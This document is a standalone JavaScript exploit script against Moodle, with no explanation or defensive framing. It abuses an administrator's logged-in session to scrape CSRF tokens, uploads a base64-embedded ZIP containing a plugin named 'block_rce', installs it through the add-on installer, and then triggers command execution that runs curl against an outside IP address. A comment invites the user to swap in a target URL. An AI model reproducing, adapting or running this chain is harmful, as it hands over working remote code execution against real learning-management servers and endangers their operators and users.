  const URL = "https://daviddoaa.me/moodle/"; // Change this to your target URL 
  fetch(URL + "admin/tool/installaddon/index.php", {
    credentials: "include",
  })
    .then((res) => {
      return res.text();
    })
    .then((data) => {
      let sesskey = data.split('"sesskey":"')[1].split('"')[0];
      let itemid = data.split("amp;itemid=")[1].split("&")[0];
      let author = data.split('title="View profile">')[1].split("<")[0];
      let clientid = data.split('client_id":"')[1].split('"')[0];

      let url =
      "data:application/x-zip-compressed;base64,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";
      fetch(url)
        .then((res) => res.blob())
        .then((blob) => {
          const file = new File([blob], "rce.zip", {
            type: "application/x-zip-compressed",
          });

          myFormData = new FormData();
          myFormData.append("title", "");
          myFormData.append("author", author);
          myFormData.append("license", "allrightsreserved");
          myFormData.append("itemid", itemid);
          myFormData.append("accepted_types[]", ".zip");
          myFormData.append("repo_id", 4);
          myFormData.append("p", "");
          myFormData.append("page", "");
          myFormData.append("env", "filepicker");
          myFormData.append("sesskey", sesskey);
          myFormData.append("client_id", clientid);
          myFormData.append("maxbytes", -1);
          myFormData.append("areamaxbytes", -1);
          myFormData.append("ctx_id", 1);
          myFormData.append("savepath", "/");
          myFormData.append("repo_upload_file", file, "rce.zip");

          fetch(
            URL + "repository/repository_ajax.php?action=upload",
            {
              method: "post",
              body: myFormData,
              credentials: "include",
            }
          )
            .then((res) => {
              return res.text();
            })
            .then((res) => {
              let zipFile = res.split("draft\\/")[1].split("\\/")[0];
              myFormData = new FormData();
              myFormData.append("sesskey", sesskey);
              myFormData.append(
                "_qf__tool_installaddon_installfromzip_form",
                1
              );
              myFormData.append("mform_showmore_id_general", 1);
              myFormData.append("mform_isexpanded_id_general", 1);
              myFormData.append("zipfile", zipFile);
              myFormData.append("plugintype", "block");
              myFormData.append("rootdir", "");
              myFormData.append(
                "submitbutton",
                "Install+plugin+from+the+ZIP+file"
              );

              fetch(
                URL + "admin/tool/installaddon/index.php",
                {
                  method: "post",
                  body: myFormData,
                  credentials: "include",
                }
              )
                .then((res) => {
                  return res.text();
                })
                .then((res) => {
               //   debugger;
                  let installzipstorage = res
                    .split('installzipstorage" value="')[1]
                    .split('"')[0];

                  myFormData = new FormData();
                  myFormData.append("installzipcomponent", "block_rce");
                  myFormData.append("installzipstorage", installzipstorage);
                  myFormData.append("installzipconfirm", 1);
                  myFormData.append("sesskey", sesskey);

                  fetch(
                    URL + "admin/tool/installaddon/index.php",
                    {
                      method: "post",
                      body: myFormData,
                      credentials: "include",
                    }
                  ).then(() => {
                    fetch(
                      URL + "blocks/rce/lang/en/block_rce.php?_=system&__=curl%20http://192.168.153.138:1234/"
                    );
                  });
                });
            });
        });
    });
